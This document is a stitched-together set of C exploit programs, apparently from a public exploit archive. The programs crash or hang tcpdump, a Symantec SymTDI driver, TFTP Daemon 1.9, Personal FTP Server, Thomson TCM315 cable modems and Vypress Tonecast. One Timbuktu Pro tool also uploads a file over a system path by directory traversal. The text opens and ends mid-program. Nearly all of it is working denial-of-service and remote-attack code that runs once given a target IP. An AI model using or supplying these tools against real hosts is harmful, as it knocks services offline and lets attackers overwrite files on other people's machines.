/*
* 2005-05-31: Modified by simon@FreeBSD.org to test tcpdump
* infinite loop vulnerability.
*/
if (payload == NULL) {
if ((payload = malloc(16)) == NULL) {
fprintf(stderr, "Out of memory\n");
exit(1);
}
pp = 0;
payload[pp++] = 0;
payload[pp++] = 33;
payload_s = pp;
}

/*
* BGP4 update messages are "dynamic" are fields have variable size. The only
* sizes we know are those for the 2 first fields ... so we need to count them
* plus their value.
*/
length = LIBNET_BGP4_UPDATE_H + u_rt_l + attr_l + info_l + payload_s;
t = libnet_build_bgp4_update(
u_rt_l, /* Unfeasible Routes Length */
withdraw_rt, /* Withdrawn Routes */
attr_l, /* Total Path Attribute Length */
attr, /* Path Attributes */
info_l, /* Network Layer Reachability Information length */
info, /* Network Layer Reachability Information */
payload, /* payload */
payload_s, /* payload size */
l, /* libnet handle */
0); /* libnet id */
if (t == -1)
{
fprintf(stderr, "Can't build BGP4 update header: %s\n", libnet_geterror(l));
goto bad;
}

length+=LIBNET_BGP4_HEADER_H;
t = libnet_build_bgp4_header(
marker, /* marker */
length, /* length */
LIBNET_BGP4_UPDATE, /* message type */
NULL, /* payload */
0, /* payload size */
l, /* libnet handle */
0); /* libnet id */
if (t == -1)
{
fprintf(stderr, "Can't build BGP4 header: %s\n", libnet_geterror(l));
goto bad;
}

length+=LIBNET_TCP_H;
t = libnet_build_tcp(
0x6666, /* source port */
179, /* destination port */
0x01010101, /* sequence number */
0x02020202, /* acknowledgement num */
TH_SYN, /* control flags */
32767, /* window size */
0, /* checksum */
0, /* urgent pointer */
length, /* TCP packet size */
NULL, /* payload */
0, /* payload size */
l, /* libnet handle */
0); /* libnet id */
if (t == -1)
{
fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
goto bad;
}

length+=LIBNET_IPV4_H;
t = libnet_build_ipv4(
length, /* length */
0, /* TOS */
242, /* IP ID */
0, /* IP Frag */
64, /* TTL */
IPPROTO_TCP, /* protocol */
0, /* checksum */
src_ip, /* source IP */
dst_ip, /* destination IP */
NULL, /* payload */
0, /* payload size */
l, /* libnet handle */
0); /* libnet id */
if (t == -1)
{
fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
goto bad;
}

/*
* Write it to the wire.
*/
c = libnet_write(l);
if (c == -1)
{
fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
goto bad;
}
else
{
fprintf(stderr, "Wrote %d byte TCP packet; check the wire.\n", c);
}

if (flag_w) free(withdraw_rt);
if (flag_a) free(attr);
if (flag_i) free(info);

libnet_destroy(l);
return (EXIT_SUCCESS);
bad:
if (flag_w) free(withdraw_rt);
if (flag_a) free(attr);
if (flag_i) free(info);

libnet_destroy(l);
return (EXIT_FAILURE);
}

void
usage(char *name)
{
fprintf(stderr,
"usage: %s -s source_ip -d destination_ip \n"
" [-m marker] [-p payload] [-S payload size]\n"
" [-w Withdrawn Routes] [-W Unfeasible Routes Length]\n"
" [-a Path Attributes] [-A Attribute Length]\n"
" [-i Reachability Information] [-I Reachability Information length]\n",
name);
}

// milw0rm.com [2005-06-09]
/*

 Testing program for Insufficient validation of "SymTDI" driver input buffer (BTP00012P002NF)

 Usage:
 prog
   (the program is executed without special arguments)

 Description:
 This program uses standard Windows API CreateFile to open "SymTDI" driver and using DeviceIoControl it sends 
 a malicious buffer to the driver that crashs the system.

 Test:
 Running the testing program.

*/

#include <stdio.h>
#include <windows.h>

void about(void)
{
  printf("Testing program for Insufficient validation of \"SymTDI\" driver input buffer (BTP00012P002NF)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test\n"
         "  (the program is executed without special arguments)\n");
  return;
}


/*
 formats and prints the error message for system last error on the standard error output
*/

void print_last_error(void)
{
  LPTSTR buf;
  DWORD code=GetLastError();
  if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,NULL,code,0,(LPTSTR)&buf,0,NULL))
  {
    fprintf(stderr,"Error code: %ld\n",code);
    fprintf(stderr,"Error message: %s",buf);
    LocalFree(buf);
  } else fprintf(stderr,"Unable to format error message for code %ld.\n",code);
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=1)
  {
    usage();
    return 1;
  }

  HANDLE file=CreateFile("\\\\.\\Global\\SymTDI",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL,OPEN_EXISTING,0,NULL);
  if (file!=INVALID_HANDLE_VALUE)
  {
    DWORD retlen;
    DeviceIoControl(file,0x83022003,(PVOID)1,256,(PVOID)1,256,&retlen,NULL);
  } else
  {
    fprintf(stderr,"Unable to open SymTDI device.\n");
    print_last_error();
    fprintf(stderr,"\n");
  }
  

  printf("\nTEST FAILED!\n");
  return 1;
}
//################################################
//
//Vulnerability: Remote Buffer Overflow Exploit
//Impact: Remote Denial of Service Attack
//Vulnerable Application: TFTP Daemon Version 1.9
//Tested on Windows XP Service Pack II
//
//Author: Socket_0x03
//Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]
//Website: www.teraexe.com
//
//################################################

#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

char Buffer_Overflow[] =
"\x00\x02"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" // A = 41. 300 bytes...
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\0"
"netascii"
"\0";

void main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
SOCKET mysocket;
int destPORT = 69;

if (argc < 2){
printf("\nVulnerability: Remote Buffer Overflow Exploit\n");
printf("Impact: Remote Denial of Service Attack\n");
printf("Vulnerable Application: TFTP Daemon Version 1.9\n");
printf("\nAuthor: Socket_0x03\n");
printf("Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]\n");
printf("Website: www.teraexe.com\n");
printf("\nUsage: exploit + IP Address\n");
printf("Example: exploit 192.168.1.100\n");
return;
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &wsaData) < 0) {
printf("No winsock suitable version found!");
return;
}
mysocket = socket(AF_INET, SOCK_DGRAM , 0);
if(mysocket==INVALID_SOCKET){
printf("Error: Cannot create a socket.\n");
exit(1);
}
printf("Resolving IP Address.\n");
if ((pTarget = gethostbyname(argv[2])) == NULL){
printf("Error: Resolve of %s failed.\n", argv[1]);
exit(1);
}
memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons(destPORT);

printf("Connecting to Daemon 1.9\n");
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){
printf("Error: Could not connect to TFTP Daemon\n");
exit(1);
}

printf("Connection Completed.\n");
Sleep(10);

printf("Sending packet.\n");
if (send(mysocket,Buffer_Overflow, sizeof(Buffer_Overflow)+1, 0) == -1){
printf("Error sending packet.\n");
closesocket(mysocket);
exit(1);
}
printf("Remote Buffer Overflow Completed.\n");

closesocket(mysocket);
WSACleanup();
}

/*
Microsoft Windows XP [Versión 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\>exploit

Vulnerability: Remote Buffer Overflow Exploit
Impact: Remote Denial of Service Attack
Vulnerable Application: TFTP Daemon Version 1.9

Author: Socket_0x03
Contact: Socket_0x03 (at) teraexe (dot) com [email concealed]
Website: www.teraexe.com

Usage: exploit + IP Address
Example: exploit 192.168.1.100

C:\>exploit 192.168.1.101
Resolving IP Address.
Connecting to Daemon 1.9
Connection Completed.
Sending packet.
Remote Buffer Overflow Completed.

C:\>
*//*
*** The Personal FTP Server 6.0f RETR DOS exploit ***

A vulnerability exists in the way Personal FTP Server handles
multiple RETR commands with overly long filenames.When confronted
with such consecutive requests the server will crash.

Usage : ./pftpdos ip port user password
Ex. : ./pftpdos 127.0.0.1 21 test test

Personal FTP Server homepage: http://www.michael-roth-software.de/

Discovey + POC by Shinnok raydenxy [at] yahoo <dot> com
http://shinnok.evonet.ro

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <string.h>
#include <malloc.h>
#include <errno.h>

int
min (int x, int y)
{
    if (x < y)return x;
    else
    return y;
}
extern int errno;

int
main (int argc, char *argv[])
{
    struct sockaddr_in server;
    int i, t, s;
    char *req, *buff;
    s = socket (AF_INET, SOCK_STREAM, 0);
    bzero (&server, sizeof (server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr (argv[1]);
    server.sin_port = htons (atoi (argv[2]));
    connect (s, (struct sockaddr *) &server, sizeof (struct sockaddr));
    req = malloc (sizeof (char) * \
    (((strlen (argv[3]) - strlen (argv[4])) + \
    min (strlen (argv[3]), strlen (argv[4])) + 8)));
    sprintf (req, "USER %s\xD\xA", argv[3]);
    write (s, req, strlen (req));
    sprintf (req, "PASS %s\xD\xA", argv[4]);
    write (s, req, strlen (req));
    free (req);
    for (i = 1; i <= 5; i++)
    {
        t = (sizeof (char) * 1000 * i);
        buff = malloc (t + 1);
        memset (buff, 'A', t);
        buff[t + 1] = '\0';
        req = malloc (t + 9);
        sprintf (req, "RETR %s\xD\xA", buff);
        if (write (s, req, strlen (req)) == -1)
        {
            perror (NULL);
            printf ("Target pwned!\n", errno);
        }
        free (req);
        free (buff);
        sleep (1);
    }
    close (s);
    return (EXIT_SUCCESS);
}

// milw0rm.com [2008-09-14]
source: http://www.securityfocus.com/bid/9091/info

A problem has been identified in Thomson Cable Modems when handling long requests on the HTTP port. Because of this, it may be possible for an attacker to deny service to legitimate users of the device. 

/*
ADVISORY - Thomson Cablemodem TCM315 Denial of Service

Shell security group (2003) http://www.shellsec.net

November 10 of 2003

Tested against: TCM315 MP
Software Version: ST31.04.00
Software Model: A801
Bootloader: 2.1.4c
Impact: Users with access to the network can remotely shutdown internet 
connection.

Discovered by: aT4r Andres[at]shellsec.net
Vendor: contacted (no answer)
Fix: no yet

usage: just, thdos.exe 192.168.100.1

*/

#include <stdio.h>
#include <winsock2.h>

void main(int argc,char *argv[]) {
char evil[150],buffer[1000];
struct sockaddr_in shellsec;
int fd;
WSADATA ws;

WSAStartup( MAKEWORD(1,1), &( ws) );

shellsec.sin_family = AF_INET;
shellsec.sin_port = htons(80);
shellsec.sin_addr.s_addr = inet_addr(argv[1]);

memset(evil,'\0',sizeof(evil));
memset(evil,'A',100);
sprintf(buffer,"GET /%s HTTP/1.1\r\n\r\n\r\n",evil);

fd = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (connect(fd,( struct sockaddr *)&shellsec,sizeof(shellsec)) != -1) {
send(fd,buffer,strlen(buffer),0);
printf("done. Thomson Cablemodem reset!\n");
sleep(100);
}
else printf("Unable to connect to CM.\n");
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/stat.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        407
#define BUFFSZ      (6 + 0xffff)
#define MAXBLOCK    0x16c5
#define CRASH       "Timbuktu Pro Note"
#define CRASHCPU    "Timbuktu Pro Note\n" \
                    "Version: 2.0 Windows\n" \
                    "File:boom\n"



int putcc(u8 *data, int chr, int len);
int putsn(u8 *data, u8 *str);
int putmm(u8 *data, u8 *str, int len);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    struct  stat    xstat;
    FILE    *fd     = NULL;
    int     sd,
            len,
            fsize;
    u16     port    = PORT;
    u8      *buff,
            *lname,
            *rname,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Timbuktu Pro <= 8.6.5 [RC 229] vulnerabilities "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s <local_file> <remote_file> <host> [port(%hu)]\n"
            "\n"
            "Attacks examples:\n"
            "  1 = timbuto CRASH NOT1B.tbn 192.168.0.1\n"
            "  2 = timbuto CRASHCPU NOT1B.tbn 192.168.0.1\n"
            "  3 = timbuto evil.exe \\../../../../../../windows/notepad2.exe 192.168.0.1\n"
            "\n", argv[0], port);
        exit(1);
    }

    lname = argv[1];
    rname = argv[2];

    if(argc > 4) port = atoi(argv[4]);
    peer.sin_addr.s_addr = resolv(argv[3]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    if(!strcmp(lname, "CRASH")) {
        fsize = sizeof(CRASH) - 1;
    } else if(!strcmp(lname, "CRASHCPU")) {
        fsize = sizeof(CRASHCPU) - 1;
    } else {
        printf("- open local file %s\n", lname);
        fd = fopen(lname, "rb");
        if(!fd) std_err();
        fstat(fileno(fd), &xstat);
        fsize = xstat.st_size;
    }

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    p = buff;
    p += putmm(p,   // pre-built initial data
        "\x00\x01\x01\x00\x00\xb0\x00\x23\x07\xff\xff\xff\xff\xff\xff\xff"
        "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x09\x04\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x01\x97\x04\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\xff\xff"
        "\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00", 182);
    send(sd, buff, p - buff, 0);

    send(sd, "\xff", 1, 0);

    p = buff;
    p += putxx(p, 0xfb,         8);
    p += putxx(p, 0,            32);
    p += putmm(p, "BINAmdos",   8);
    p += putxx(p, 0xffffffff,   32);
    p += putxx(p, 0xffffffff,   32);
    p += putxx(p, 0,            32);
    p += putxx(p, fsize,        32);
    p += putxx(p, 0,            32);
    p += putxx(p, -1,           32);
    p += putcc(p, 0,            18);
    p += putsn(p, rname);
    send(sd, buff, p - buff, 0);

    send(sd, "\xf9\x00", 2, 0);

    if(!strcmp(lname, "CRASH")) {
        p = buff;
        p += putxx(p, 0xf8,     8);
        p += putxx(p, fsize,    16);
        p += putmm(p, CRASH,    fsize);
        printf("- send malformed message\n");
        send(sd, buff, p - buff, 0);

    } else if(!strcmp(lname, "CRASHCPU")) {
        p = buff;
        p += putxx(p, 0xf8,     8);
        p += putxx(p, fsize,    16);
        p += putmm(p, CRASHCPU, fsize);
        printf("- send malformed message\n");
        send(sd, buff, p - buff, 0);

    } else {
        printf("- upload file: ");
        for(;;) {
            len = fread(buff + 3, 1, MAXBLOCK, fd);
            if(len <= 0) break;
            buff[0] = 0xf8;
            putxx(buff + 1, len,    16);
            send(sd, buff, 3 + len, 0);
            fputc('.', stdout);
        }
        fclose(fd);
    }

    send(sd, "\xf7", 1, 0);
    send(sd, "\xfa", 1, 0);
    send(sd, "\xfe", 1, 0);

    printf("\n- receive data: ");
    for(;;) {
        if(timeout(sd, 3) < 0) break;
        len = recv(sd, buff, BUFFSZ, 0);
        if(len <= 0) break;
        fputc('.', stdout);
    }

    close(sd);
    free(buff);
    printf("\n- done\n");
    return(0);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int putsn(u8 *data, u8 *str) {
    int     len;

    len = strlen(str);
    data[0] = len;
    memcpy(data + 1, str, len);
    return(1 + len);
}



int putmm(u8 *data, u8 *str, int len) {
    memcpy(data, str, len);
    return(len);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    30000
#define BCAST   "255.255.255.255"
#define MAXSZ   8192    /* don't modify */
#define PCK     /* this a piece of a MP3 file causing the crash, but the program reads mp2 */ \
                "\xFF\xFF\x41\xA7\x74\x80\x50\x04\x00\x38\x00\x00\x00\x03\x81\xC0" \
                "\x00\x00\x30\x14\x01\x5B\x28\xEE\xFF\xE6\x3F\xBF\xFF\xFF\xFF\xFF" \
                "\xFF\x9B\xD1\x7F\xFF\xFF\xA2\x8F\x7D\xF3\xCB\xBD\xF7\xDE\x69\xA6" \
                "\x5C\x0C\x12\xF0\x33\xBE\xE7\xAC\x29\x11\x14\x18\x12\x3A\x97\xDD" \
                "\x20\xC0\x28\x93\xFB\x8F\x4B\x01\x2D\x93\x9C\x8A\x9F\xEA\x52\xB1" \
                "\x59\xE3\x2D\x61\xC8\x61\xFF\xEF\x0A\x62\xA0\xC3\x47\xAF\x16\x4C" \
                "\x46\x65\xDD\x67\xC7\xD5\xB4\x53\x71\x61\xAD\xD4\xD7\x62\xB2\x97" \
                "\x65\x7E\xB1\xC2\xE5\xE7\xFA\xEE\xBD\x76\x38\xAE\xF3\x84\x83\xE5" \
                "\x90\x58\x68\x39\x98\xBB\x6F\xBA\x9A\xA4\x9A\xEC\x86\xC1\xA0\xD7" \
                "\x7F\x7F\xCF\xF4\x24\x38\x69\x0C\x92\xA8\x82\x88\x0E\xEA\xC5\x78" \
                "\x8B\x97\x62\x3A\xFC\x61\x04\x43\x0F\x20\xA9\x04\x41\x86\xB1\xFE" \
                "\x67\xF8\x6B\x5F\x94\x8D\x29\xD8\x12\xD0\x4E\x78\x5A\xED\x4C\xE6" \
                "\x2A\x4C\x05\x6C\x6E\x6F\xAB\x37\x5F\xCE\x4B\x59\x73\x85\x94\xF3" \
                "\x24\x5A\xAB\x96\x75\xC4\x53\xEF\x0F\xF3\xBD\xD7\x77\x96\xBF\x7F" \
                "\xB7\x51\xA7\xB3\xA7\xE6\x18\x6F\x27\xA9\x14\xC2\x1D\xCD\xB5\x67" \
                "\x69\x87\x07\x3A\x6F\xDD\xAB\xCA\xC0\xD3\x59\x62\xC0\x2C\x56\x1A" \
                "\xFA\x46\x1B\x9C\x51\x72\x32\xC5\x88\xE9\xAE\x9F\xD7\xEF\x7A\xFF" \
                "\xE6\x5A\xE6\xBF\xF9\xD7\xB3\x07\x2E\xA3\x91\x14\x86\x21\x97\x5E" \
                "\xA5\x79\x44\xA2\xA4\xE7\xFF\xFF\xFC\x79\xAE\xA0\x3A\x15\x65\xF5" \
                "\x6B\x8E\xAC\x6F\x56\x5C\x5A\x06\xA0\xCF\x7E\x86\x9B\x3A\x20\x72" \
                "\x61\xC1\x68\xB4\x5C\x36\x1B\x0F\xC5\xC2\x50\xD0\x48\x48\x87\xA0" \
                "\x88\xF1\x04\xB9\xAD\xA8\x7E\x7A\x26\x4A\x46\x7F\xE5\x12\x88\x2E" \
                "\x09\x15\xFF\xE8\x13\x62\x43\x53\x35\x3B\xB5\xCF\xFF\xFE\x84\x59" \
                "\xA1\xC6\x06\x63\xC4\x00\xE2\x9A\x89\xFF\xFF\xFF\x93\x3C\xC2\xCB" \
                "\x29\xE5\x79\xB8\xA3\x4E\x2E\xC8\xA4\x87\xFF\xFF\xFF\xF5\x2D\x51" \
                "\xF7\xE3\xB7\x6D\x6E\x9C\xC3\x45\xD1\xE1\x9F\xD7\x00\x3C\x1F\x01" \
                "\x8B\x1B\x38\x93\x24\xDB\x4B\xBF\xF3\x46\xF5\xB3\xFD\x61\x22\xEA" \
                "\x0C\x96\xA5\xFF\xFB\x78\x60\x01\x80\x03\xC3\x51\xE1\x6E\x24\x60" \
                "\x00\x25\x80\x5B\x45\xC1\x00\x00\x91\x75\xDF\x79\xBC\x93\x00\x28" \
                "\x92\x85\x6B\x57\x8E\x20\x02\x7A\xD9\x7B\x95\xCB\x25\x4E\x27\x13" \
                "\x8E\x64\x94\x23\xD0\x3D\x26\xAE\x4D\xEE\xDD\xE6\xEE\x2C\x46\x4A" \
                "\x28\x1D\x28\xF4\x28\x29\x90\xCE\x79\x23\x02\x29\xCD\x48\xAB\x5E" \
                "\x04\x01\x41\x26\x71\xF2\xB9\x1C\xE9\x70\xE3\x31\x64\x45\x23\x65" \
                "\x0C\x8D\x9B\x2C\xBB\x72\x79\xC6\xAD\x30\x6A\xA4\x6B\x03\x13\xEC" \
                "\xD5\xF8\xDD\x79\xF0\xA3\xE8\xDB\xE8\x45\xF5\x88\xFB\x30\xC0\xF1" \
                "\xD2\x02\x80\x61\x94\xF6\x27\x3C\xE4\x3D\x4C\x88\xCE\x07\x81\x41" \
                "\x50\x0A\x3A\x4F\x17\x1A\x8F\xDE\x82\xC4\x54\x79\x40\x40\x00\x00" \
                "\x01\x22\xC1\x91\x6B\xEE\xDD\x2A\x77\xD5\xF6\xAB\xF1\xF7\x27\xF4" \
                "\x75\x29\x1F\xFC\x2F\x4E\x9F\xEF\xFC\x4B\x66\x8F\xDF\xFF\xF6\x1E" \
                "\xB8\x32\xC5\xD2\x5B\xA4\x49\xC8\x93\x9D\x31\x01\x08\x44\x1C\x01" \
                "\x57\x12\x2A\xC1\x56\xDA\x8D\x35\x3C\x7C\x33\x25\xE7\xC3\xC5\x4B" \
                "\xDE\x63\xFD\x9C\xAC\x67\x97\x7C\xEE\x76\xA2\xA3\xBC\x4F\xA6\xBC" \
                "\xD3\xBF\x2F\x30\xAB\x78\x4A\x9B\xDC\xC4\xA1\x87\x79\x64\x72\xDD" \
                "\x9C\x8F\xFF\x3E\x77\xED\x4D\xBB\xEF\xEF\xE6\x14\xEC\xFA\xEE\xCD" \
                "\xD5\xB1\x75\xCE\x7F\x3A\x5E\xFA\x9D\xA6\xA7\x41\xDA\x66\xE9\xB9" \
                "\xCF\xE6\x92\xDF\x25\xDB\x2E\xDE\xDB\x73\x3E\x3C\xF6\x77\x89\xFB" \
                "\x76\xFD\xEF\x3E\x9D\x3D\xFF\x86\xBF\xE1\xDB\xF6\xAD\xFD\xE7\x6A" \
                "\xB9\x93\xB7\xBB\x3F\x7F\xD1\x09\x38\x29\x58\xBA\x3A\x60\x08\x00" \
                "\x2B\x04\x24\x50\xD5\xAD\xA7\x5B\xC4\x18\x3F\x55\x6D\xE3\xBD\x48" \
                "\x55\xDF\xFD\x5F\xA7\xF7\xF5\x7B\x35\x2B"



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                len;
    u_short     port = PORT;
    u_char      *buff;


    setbuf(stdout, NULL);

    fputs("\n"
        "Vypress Tonecast receiver <= 1.3 broadcast crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n"
            " Note: you can launch this tool also versus a broadcast IP\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]);

    if(!memcmp(argv[1], BCAST, sizeof(BCAST) - 1)) {
        peer.sin_addr.s_addr = 0xffffffffL;
    } else {
        peer.sin_addr.s_addr = resolv(argv[1]);
    }
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    i = 1;  /* broadcast */
    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&i, sizeof(i))
     < 0) std_err();

    len = MAXSZ + sizeof(PCK) - 1;  /* avoid buffer problems */
    buff = malloc(len);
    if(!buff) std_err();

    for(i = 0; i < MAXSZ; i += sizeof(PCK) - 1) {
        memcpy(buff + i, PCK, sizeof(PCK) - 1);
    }

    fputs("- send BOOM data\n", stdout);
    if(sendto(sd, buff, MAXSZ, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    close(sd);
    fputs("- finished\n\n", stdout);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

  by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        28000
#define BUFFSZ      1500    // max packet size, while all the strings are fixed at max 256
#define PADDING(X)  ((X + 7) & (~7))



void fgetz(u8 *data, int len);
int write_bstr(u8 *data, int b, u8 *str, int len);
int udp_sock(void);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



   enum PacketTypes
   {
